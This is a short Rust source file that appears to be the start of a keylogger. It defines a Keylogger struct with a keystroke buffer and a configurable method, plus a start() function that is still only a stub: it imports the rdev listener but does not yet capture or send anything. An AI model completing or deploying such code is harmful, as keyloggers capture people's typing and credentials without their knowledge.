use crate::build::method::Method;

use rdev::listen;

use std::io::Result;
use std::thread;
use std::sync::{
    Arc, Mutex
};

pub struct Keylogger {
    method: Method,
    buffer : Vec<String>,
    buffer_capacity: usize,
}

impl Keylogger {
    pub fn new(method: Method) -> Self {
        Self {
            method,
            buffer: Vec::new(),
            buffer_capacity: 0,
        }
    }

    pub fn set_buffer_cap(mut self, new_cap: usize) -> Self {
        self.buffer_capacity = new_cap;
        self
    }

    pub fn start(&mut self) -> Result<()> {
        let end_execution: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
        let ee_p = end_execution.clone();
        let listener = thread::spawn(move || {
            let end = ee_p.lock().unwrap();
            if *end {
               return
            }
        });
        Ok(())
    }
}
